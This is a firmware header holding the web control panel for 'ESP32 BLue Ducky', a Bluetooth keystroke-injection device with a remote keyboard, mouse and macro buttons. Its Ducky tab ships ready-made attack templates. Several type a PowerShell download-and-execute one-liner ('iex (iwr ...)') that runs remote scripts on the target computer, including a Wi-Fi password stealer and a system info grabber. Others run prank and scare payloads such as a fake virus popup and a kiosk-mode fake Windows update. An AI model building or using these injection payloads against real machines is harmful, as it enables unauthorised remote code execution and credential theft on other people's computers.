const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>ESP32 BLue Ducky</title>
  <style>
    :root{--bg:#090b10;--glass:rgba(20,25,35,0.6);--border:rgba(0,229,255,0.15);--primary:#00e5ff;--acc:#ff0055;--text:#e2e8f0;--glow:0 0 15px rgba(0,229,255,0.3);}
    html, body { height: 100%; touch-action: manipulation; }
    *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,sans-serif;-webkit-tap-highlight-color:transparent;}
    body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;overflow:hidden;user-select:none;}
    header{background:var(--glass);backdrop-filter:blur(10px);padding:15px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border);z-index:10;}
    h1{font-size:1.1rem;color:var(--primary);text-shadow:var(--glow);letter-spacing:1px;text-transform:uppercase;}
    .tabs{display:flex;background:var(--glass);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);}
    .tab{flex:1;text-align:center;padding:12px 0;font-size:0.75rem;font-weight:700;color:#64748b;cursor:pointer;transition:all .2s;}
    .tab.active{color:var(--primary);border-bottom:2px solid var(--primary);text-shadow:var(--glow);}
    .page{flex:1;overflow-y:auto;padding:15px;display:none;flex-direction:column;gap:15px;animation:fade .3s;}
    .page.active{display:flex;}
    @keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
    
    /* Keyboard */ 
    .kb-sec{background:var(--glass);backdrop-filter:blur(10px);border:1px solid var(--border);border-radius:12px;padding:10px;display:flex;flex-direction:column;gap:5px;}
    .row{display:flex;gap:5px;}
    .k{flex:1;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:12px 0;text-align:center;font-size:0.85rem;font-weight:600;transition:.1s;min-width:0;cursor:pointer;}
    .k:active,.k.act{background:var(--primary);color:#000;transform:scale(0.95);box-shadow:var(--glow);}
    .k.mod{color:var(--primary);background:rgba(0,229,255,0.05);}
    .k.mod.act{background:var(--primary);color:#000;}
    .k.w15{flex:1.5}.k.w2{flex:2}.k.w5{flex:5}
    .k.sm{padding:10px 0;font-size:0.7rem;}
    .live-txt{display:flex;gap:10px;background:var(--glass);padding:10px;border-radius:12px;border:1px solid var(--border);}
    .live-txt input{flex:1;background:0 0;border:none;color:var(--text);outline:none;font-size:1rem;}
    .live-txt .k{flex:unset;padding:10px 20px;}

    /* Mouse */
    .pad{flex:1;background:var(--glass);border:1px dashed var(--border);border-radius:15px;display:flex;align-items:center;justify-content:center;color:#64748b;touch-action:none;}
    .pad.act{border-color:var(--primary);color:var(--primary);box-shadow:inset var(--glow);}
    .m-btns{display:flex;gap:10px;}
    .m-btn{flex:1;background:var(--glass);border:1px solid var(--border);padding:15px 0;text-align:center;border-radius:12px;font-weight:700;color:var(--primary);cursor:pointer;user-select:none;}
    .m-btn:active,.m-btn.act{background:var(--primary);color:#000;transform:scale(0.95);}

    /* Commands */
    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
    .cmd-btn{background:var(--glass);border:1px solid var(--border);padding:15px 10px;border-radius:12px;text-align:center;font-size:0.8rem;transition:.2s;cursor:pointer;}
    .cmd-btn:active{background:var(--primary);color:#000;transform:scale(0.95);}

    /* Ducky */
    .editor{flex:1;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:12px;color:var(--primary);padding:15px;font-family:monospace;resize:none;outline:none;}
    .run-btn{background:var(--primary);color:#000;padding:15px;border-radius:12px;text-align:center;font-weight:800;font-size:1rem;text-transform:uppercase;cursor:pointer;}

    .toast{position:fixed;bottom:-50px;left:50%;transform:translateX(-50%);background:var(--primary);color:#000;padding:10px 20px;border-radius:20px;font-weight:700;transition:.3s;z-index:100;opacity:0;}
    .toast.show{bottom:20px;opacity:1;}
  </style>
</head>
<body>
<header>
  <h1>⚡ESP32 BLue Ducky By ShadowGlint</h1>
  <div id="stat" style="color:#00e676;font-size:0.8rem;font-weight:bold;display:flex;align-items:center;gap:5px;">
    <span style="display:inline-block;width:8px;height:8px;background:#00e676;border-radius:50%;box-shadow:0 0 10px #00e676;"></span> CONN
  </div>
</header>
<div class="tabs">
  <div class="tab active" onclick="tab('kb',this)">⌨ KB</div>
  <div class="tab" onclick="tab('ms',this)">🖱 MOUSE</div>
  <div class="tab" onclick="tab('cmd',this)">⚡ CMD</div>
  <div class="tab" onclick="tab('duck',this)">🦆 DUCKY</div>
  <div class="tab" onclick="tab('set',this)">⚙ SET</div>
</div>

<div id="kb" class="page active">
  <div class="live-txt">
    <input type="text" id="live" placeholder="Live type or paste...">
    <div class="k mod" onclick="sndTxt()">SEND</div>
  </div>
  <div class="kb-sec">
    <div class="row">
      <div class="k sm" d="177">ESC</div>
      <div class="k sm" d="194">F1</div><div class="k sm" d="195">F2</div><div class="k sm" d="196">F3</div>
      <div class="k sm" d="197">F4</div><div class="k sm" d="198">F5</div><div class="k sm" d="199">F6</div>
    </div>
    <div class="row">
      <div class="k sm" d="49">1</div><div class="k sm" d="50">2</div><div class="k sm" d="51">3</div>
      <div class="k sm" d="52">4</div><div class="k sm" d="53">5</div><div class="k sm" d="54">6</div>
      <div class="k sm" d="55">7</div><div class="k sm" d="56">8</div><div class="k sm" d="57">9</div>
      <div class="k sm" d="48">0</div>
    </div>
    <div class="row">
      <div class="k" d="113">Q</div><div class="k" d="119">W</div><div class="k" d="101">E</div>
      <div class="k" d="114">R</div><div class="k" d="116">T</div><div class="k" d="121">Y</div>
      <div class="k" d="117">U</div><div class="k" d="105">I</div><div class="k" d="111">O</div>
      <div class="k" d="112">P</div>
    </div>
    <div class="row">
      <div class="k" d="97">A</div><div class="k" d="115">S</div><div class="k" d="100">D</div>
      <div class="k" d="102">F</div><div class="k" d="103">G</div><div class="k" d="104">H</div>
      <div class="k" d="106">J</div><div class="k" d="107">K</div><div class="k" d="108">L</div>
    </div>
    <div class="row">
      <div class="k mod w15" d="225">SHFT</div>
      <div class="k" d="122">Z</div><div class="k" d="120">X</div><div class="k" d="99">C</div>
      <div class="k" d="118">V</div><div class="k" d="98">B</div><div class="k" d="110">N</div>
      <div class="k" d="109">M</div>
      <div class="k mod w15" d="178">⌫</div>
    </div>
    <div class="row">
      <div class="k mod" d="224">CTRL</div>
      <div class="k mod" d="227">WIN</div>
      <div class="k mod" d="226">ALT</div>
      <div class="k w5" d="32">SPACE</div>
      <div class="k mod w2" d="176">⏎</div>
    </div>
  </div>
  <div class="kb-sec">
    <div class="row">
      <div class="k sm" d="209">INS</div><div class="k sm" d="212">DEL</div>
      <div class="k mod sm" d="218">↑</div>
      <div class="k sm" d="211">PU</div><div class="k sm" d="214">PD</div>
    </div>
    <div class="row">
      <div class="k sm" d="210">HM</div><div class="k sm" d="213">END</div>
      <div class="k mod sm" d="216">←</div><div class="k mod sm" d="217">↓</div><div class="k mod sm" d="215">→</div>
    </div>
  </div>
</div>

<div id="ms" class="page">
  <div class="pad" id="pad">👆 TOUCHPAD</div>
  <div class="row" style="height:60px; flex:none;">
    <div class="k mod" onpointerdown="sc('up')" onpointerup="cs()" onpointerleave="cs()" style="display:flex;align-items:center;justify-content:center">▲ SCRL</div>
    <div class="k mod" onpointerdown="sc('down')" onpointerup="cs()" onpointerleave="cs()" style="display:flex;align-items:center;justify-content:center">▼ SCRL</div>
  </div>
  <div class="m-btns" style="flex:none;">
    <div class="m-btn" m="click_left">LEFT</div>
    <div class="m-btn" m="click_middle" style="color:#ff0055">MID</div>
    <div class="m-btn" m="click_right" style="color:#ff0055">RIGHT</div>
  </div>
  <div class="m-btns" style="flex:none;">
    <div class="m-btn" m="dbl_click">DBL CLICK</div>
    <div class="m-btn" id="dragBtn" style="color:#00e676">DRAG: OFF</div>
  </div>
</div>

<div id="cmd" class="page">
  <div class="grid">
    <div class="cmd-btn" c="chrome">🌐 Chrome</div>
    <div class="cmd-btn" c="youtube">▶️ YouTube</div>
    <div class="cmd-btn" c="lock">🔒 Lock PC</div>
    <div class="cmd-btn" c="desktop">🖥️ Desktop</div>
    <div class="cmd-btn" c="screenshot">📸 Screenshot</div>
    <div class="cmd-btn" c="task_mgr">📊 Task Mgr</div>
    <div class="cmd-btn" c="settings">⚙️ Settings</div>
    <div class="cmd-btn" c="explorer">📁 Explorer</div>
    <div class="cmd-btn" c="cmd">⬛ CMD</div>
    <div class="cmd-btn" c="powershell">🟦 PowerShell</div>
    <div class="cmd-btn" c="wifi_pass" style="color:#ff0055;border-color:rgba(255,0,85,0.3)">🔑 WiFi Pass</div>
    <div class="cmd-btn" c="sleep">🌙 Sleep</div>
    <div class="cmd-btn" c="vol_up">🔊 Vol Up</div>
    <div class="cmd-btn" c="vol_down">🔉 Vol Down</div>
    <div class="cmd-btn" c="play_pause">⏯ Play/Pause</div>
    <div class="cmd-btn" c="copy">📄 Copy</div>
    <div class="cmd-btn" c="paste">📋 Paste</div>
    <div class="cmd-btn" c="undo">↩️ Undo</div>
    <div class="cmd-btn" c="close_window">❌ Close Win</div>
    <div class="cmd-btn" c="new_tab">➕ New Tab</div>
    <div class="cmd-btn" c="close_tab">➖ Close Tab</div>
    <div class="cmd-btn" c="ipconfig">🌐 IPConfig</div>
  </div>
</div>

<div id="duck" class="page">
  <select id="dtmpl" style="padding:10px;background:var(--glass);color:var(--primary);border:1px solid var(--border);border-radius:8px;outline:none;">
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING chrome https://github.com/Moajjem404/ESP32-BlueDucky/blob/main/instruction/README.md\nENTER">📖 Instructions & GitHub</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/hacked.ps1 -UseBasicParsing)\nENTER">💀 You Have Been Hacked</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/matrix.ps1 -UseBasicParsing)\nENTER">🧑‍💻 Matrix Hacker Screen</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/wallpaper.ps1 -UseBasicParsing)\nENTER">🖼️ Set Hacker Wallpaper</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/popup.ps1 -UseBasicParsing)\nENTER">⚠️ Fake Virus Popup</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/notepad_flood.ps1 -UseBasicParsing)\nENTER">👻 Ghost Notepad Flood</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/sysinfo.ps1 -UseBasicParsing)\nENTER">📊 System Info Grabber</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING iex (iwr https://raw.githubusercontent.com/Moajjem404/ESP32-BlueDucky/refs/heads/main/payloads/wifi_stealer.ps1 -UseBasicParsing)\nENTER">📡 Extract WiFi Passwords</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING chrome --kiosk https://fakeupdate.net/win10ue/\nENTER">🔄 Fake Windows Update</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Warning! You have been hacked by Blue Ducky.')\nENTER">🗣️ PC Voice Message</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING notepad\nENTER\nDELAY 500\nSTRING Hello! ESP32 BlueDucky is working perfectly!\nENTER">📝 Notepad Typer</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING netsh wlan show profile\nENTER">🔑 Show WiFi Profiles</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING chrome youtube.com\nENTER">▶️ Open YouTube</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 1000\nSTRING curl ascii.live/rick\nENTER">🕺 Rickroll Terminal</option>
    <option value="DELAY 500\nGUI r\nDELAY 200\nSTRING cmd\nENTER\nDELAY 500\nSTRING ipconfig\nENTER">🌐 IPConfig</option>
    <option value="DELAY 200\nGUI d">🖥️ Show Desktop</option>
    <option value="DELAY 200\nGUI l">🔒 Lock PC</option>
  </select>
  <textarea class="editor" id="dscr" spellcheck="false">DELAY 500
GUI r
DELAY 200
STRING chrome https://github.com/Moajjem404/ESP32-BlueDucky/blob/main/instruction/README.md
ENTER</textarea>
  <div class="run-btn" onclick="rn()">▶ RUN SCRIPT</div>
</div>

<div id="set" class="page">
  <div class="kb-sec" style="padding:20px;gap:15px">
    <h3 style="color:var(--primary)">⚙️ Mouse Sensitivity</h3>
    <input type="range" id="sens" min="1" max="10" value="5" onchange="f('/cmd?type=sensitivity&val='+this.value)" style="width:100%">
    <h3 style="color:var(--primary);margin-top:10px;">📡 Network Info</h3>
    <div id="neti" style="font-family:monospace;color:#64748b;line-height:1.5;">Loading...</div>
    <div class="cmd-btn" onclick="rels()" style="margin-top:20px;background:rgba(255,0,85,0.1);color:#ff0055;border-color:rgba(255,0,85,0.3)">Release All Keys (Panic Button)</div>
  </div>
</div>

<div class="toast" id="tst">✓ Done</div>

<script>
function $(s){return document.querySelector(s)}
function $$(s){return document.querySelectorAll(s)}
function tab(id,e){
  $$('.page,.tab').forEach(x=>x.classList.remove('active'));
  $('#'+id).classList.add('active'); e.classList.add('active');
  if(id==='set') fetch('/status').then(r=>r.json()).then(d=>{$('#neti').innerHTML=`SSID: ${d.ssid}<br>IP: ${d.ip}<br>Clients: ${d.clients}`;$('#sens').value=d.sens;$('#stat').style.color=d.ble?'#00e676':'#ff0055';$('#stat span').style.background=d.ble?'#00e676':'#ff0055';$('#stat span').style.boxShadow=d.ble?'0 0 10px #00e676':'0 0 10px #ff0055';});
}
function tst(m){let t=$('#tst');t.innerText=m||'✓ Sent';t.classList.add('show');setTimeout(()=>t.classList.remove('show'),1500)}
function f(u){fetch(u).catch(e=>console.log(e))}

// Keys
const ak=new Set();
$$('.k[d]').forEach(e=>{
  let d=e.getAttribute('d');
  e.onpointerdown=x=>{e.classList.add('act');if(!ak.has(d)){ak.add(d);f('/cmd?type=press&val='+d)}}
  e.onpointerup=e.onpointerleave=e.onpointercancel=x=>{e.classList.remove('act');if(ak.has(d)){ak.delete(d);f('/cmd?type=release&val='+d)}}
});
function sndTxt(){let i=$('#live');if(i.value){f('/cmd?type=text&val='+encodeURIComponent(i.value));i.value='';tst('Text Sent')}}
$('#live').onkeydown=e=>{if(e.key==='Enter')sndTxt()};
function rels(){f('/cmd?type=releaseall');tst('Keys Released')}

// Mouse
let p=$('#pad'), lx=0, ly=0, th=0;
p.ontouchstart=e=>{e.preventDefault();lx=e.touches[0].clientX;ly=e.touches[0].clientY;p.classList.add('act')}
p.ontouchend=p.ontouchcancel=e=>{e.preventDefault();p.classList.remove('act')}
p.ontouchmove=e=>{
  e.preventDefault(); if(th)return;
  let x=e.touches[0].clientX, y=e.touches[0].clientY, dx=Math.round(x-lx), dy=Math.round(y-ly);
  lx=x; ly=y;
  if(dx||dy){th=setTimeout(()=>{f('/mouse?dx='+dx+'&dy='+dy);th=0},20)}
}
let drg=0;
$('#dragBtn').onclick=e=>{
  drg=!drg;
  e.target.innerText=drg?'DRAG: ON':'DRAG: OFF';
  e.target.style.background=drg?'var(--primary)':'var(--glass)';
  e.target.style.color=drg?'#000':'#00e676';
  f('/mouseaction?action='+(drg?'press_left':'release_left'));
}
$$('.m-btn[m]').forEach(e=>{
  e.onpointerdown=x=>{e.classList.add('act');f('/cmd?type=mouse&val='+e.getAttribute('m'))}
  e.onpointerup=e.onpointerleave=e.onpointercancel=x=>{e.classList.remove('act')}
});
let si=0;
function sc(d){f('/cmd?type=scroll&val='+d);si=setInterval(()=>f('/cmd?type=scroll&val='+d),100)}
function cs(){clearInterval(si);si=0}

// Cmd
$$('.cmd-btn[c]').forEach(e=>{
  e.onclick=()=>{f('/cmd?type=macro&val='+e.getAttribute('c'));tst()}
});

// Ducky
$('#dtmpl').onchange=e=>$('#dscr').value=e.target.value.replace(/\\n/g,'\n');
function rn(){
  fetch('/script',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'plain='+encodeURIComponent($('#dscr').value)});
  tst('Running Script');
}

// Global typing catch
document.addEventListener('keydown', e=>{
  if(document.activeElement.tagName==='INPUT' || document.activeElement.tagName==='TEXTAREA') return;
  if(e.key.length===1) f('/cmd?type=text&val='+encodeURIComponent(e.key));
});
</script>
</body>
</html>
)rawliteral";
